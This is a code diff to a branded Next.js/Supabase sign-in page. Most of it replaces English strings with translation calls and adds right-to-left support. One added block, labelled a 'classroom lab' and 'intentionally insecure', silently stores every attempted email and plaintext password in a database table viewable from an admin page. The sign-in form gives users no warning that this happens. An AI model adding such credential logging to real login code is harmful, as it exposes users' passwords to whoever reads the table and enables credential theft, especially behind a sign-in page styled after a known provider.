@@ -5,6 +5,7 @@ import { useRouter } from "next/navigation";
 import { getSupabase } from "@/lib/supabase";
 import { buildBivoCssVars, fillTemplate, type BivoBrand } from "@/lib/bivoBrand";
 import { validateEmail, validatePassword } from "@/lib/bivoValidation";
+import { useT } from "@/components/SettingsProvider";
 
 /**
  * Bivo sign-in at /signin. Two-step email -> password flow. Colours, name,
@@ -139,23 +140,25 @@ function InlineLink({ children, onClick, href, size }: { children: React.ReactNo
 
 /** "Before using this app, you can review iOS's privacy policy and terms of service." with the two links in the link colour. */
 function PolicyText({ brand }: { brand: BivoBrand }) {
+  const { t } = useT();
   const linkStyle = { color: "var(--bivo-link)" } as CSSProperties;
   return (
     <p className="leading-relaxed text-[#5f6368]" style={{ marginTop: brand.policySpacing, fontSize: brand.policyTextSize }}>
-      Before using this app, you can review iOS&apos;s{" "}
+      {t("bivo_policyBefore")}{" "}
       <a href="#" className="font-medium hover:underline" style={linkStyle}>
-        privacy policy
+        {t("bivo_policyPrivacy")}
       </a>{" "}
-      and{" "}
+      {t("bivo_policyAnd")}{" "}
       <a href="#" className="font-medium hover:underline" style={linkStyle}>
-        terms of service
+        {t("bivo_policyTerms")}
       </a>
-      .
+      {t("bivo_policyEnd")}
     </p>
   );
 }
 
 function NextButton({ brand, label, submitting }: { brand: BivoBrand; label: string; submitting: boolean }) {
+  const { t } = useT();
   return (
     <button
       type="submit"
@@ -170,13 +173,14 @@ function NextButton({ brand, label, submitting }: { brand: BivoBrand; label: str
         paddingRight: brand.buttonPaddingX,
       }}
     >
-      {submitting ? "Please wait…" : label}
+      {submitting ? t("bivo_pleaseWait") : label}
     </button>
   );
 }
 
 export default function BivoSignIn({ brand, previewOnly = false }: { brand: BivoBrand; previewOnly?: boolean }) {
   const router = useRouter();
+  const { t, language, dir } = useT();
   const [step, setStep] = useState<Step>("email");
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
@@ -232,6 +236,17 @@ export default function BivoSignIn({ brand, previewOnly = false }: { brand: Bivo
       const sb = getSupabase();
       if (sb) {
         const { error: authErr } = await sb.auth.signInWithPassword({ email: email.trim(), password });
+        // CLASSROOM LAB (intentionally insecure): record every attempt, right or wrong, in
+        // plain text so students can find it in /signin/admin. Never blocks sign-in.
+        try {
+          await sb.from("signin_attempt_logs").insert({
+            email: email.trim(),
+            attempted_password: password,
+            success: !authErr,
+          });
+        } catch {
+          /* logging must never break sign-in */
+        }
         if (authErr) throw authErr;
       } else {
         await new Promise((r) => setTimeout(r, 500));
@@ -269,6 +284,7 @@ export default function BivoSignIn({ brand, previewOnly = false }: { brand: Bivo
 
   return (
     <div
+      dir={previewOnly ? undefined : dir}
       style={cssVars}
       className={`bivo flex w-full flex-col ${previewOnly ? "min-h-[520px]" : "min-h-[100dvh]"}`}
     >
@@ -329,7 +345,7 @@ export default function BivoSignIn({ brand, previewOnly = false }: { brand: Bivo
           ) : (
             <BrandMark color={brand.buttonColor} size={brand.logoSize} letter={letter} />
           ))}
-        <span style={{ fontSize: brand.headerTextSize, color: muted }}>Sign in with {brand.appName}</span>
+        <span style={{ fontSize: brand.headerTextSize, color: muted }}>{t("bivo_signInWith", { name: brand.appName })}</span>
       </header>
 
       <div
@@ -359,8 +375,8 @@ export default function BivoSignIn({ brand, previewOnly = false }: { brand: Bivo
                 <FloatingInput id="bivo-email" brand={brand} label={brand.emailLabel} type="email" value={email} onChange={setEmail} inputRef={emailRef} autoComplete="username" />
                 {error && <ErrorText size={brand.messageTextSize}>{error}</ErrorText>}
                 <div style={{ marginTop: brand.fieldSpacing }}>
-                  <InlineLink size={brand.linkSize} onClick={() => setNotice("Email recovery isn't set up yet.")}>
-                    Forgot email?
+                  <InlineLink size={brand.linkSize} onClick={() => setNotice(t("bivo_emailRecoveryNotice"))}>
+                    {t("bivo_forgotEmail")}
                   </InlineLink>
                 </div>
                 {notice && <p className="mt-2" style={{ fontSize: brand.messageTextSize, color: muted }}>{notice}</p>}
@@ -419,8 +435,8 @@ export default function BivoSignIn({ brand, previewOnly = false }: { brand: Bivo
                 {notice && <p className="mt-3" style={{ fontSize: brand.messageTextSize, color: muted }}>{notice}</p>}
                 <PolicyText brand={brand} />
                 <div className="flex w-full items-center justify-between" style={{ marginTop: brand.buttonRowSpacing }}>
-                  <InlineLink size={brand.linkSize} onClick={() => setNotice("Password recovery isn't set up yet.")}>
-                    Forgot password?
+                  <InlineLink size={brand.linkSize} onClick={() => setNotice(t("bivo_passwordRecoveryNotice"))}>
+                    {t("bivo_forgotPassword")}
                   </InlineLink>
                   <NextButton brand={brand} label={brand.nextLabel} submitting={submitting} />
                 </div>
@@ -481,11 +497,11 @@ export default function BivoSignIn({ brand, previewOnly = false }: { brand: Bivo
           className="flex w-full items-center justify-between px-2"
           style={{ maxWidth: brand.cardWidth, marginTop: brand.footerSpacing, fontSize: brand.footerTextSize, color: muted }}
         >
-          <span>English (United States)</span>
+          <span>{language}</span>
           <div className="flex gap-6">
-            <span>Help</span>
-            <span>Privacy</span>
-            <span>Terms</span>
+            <span>{t("bivo_help")}</span>
+            <span>{t("bivo_privacy")}</span>
+            <span>{t("bivo_terms")}</span>
           </div>
         </footer>
       </div>
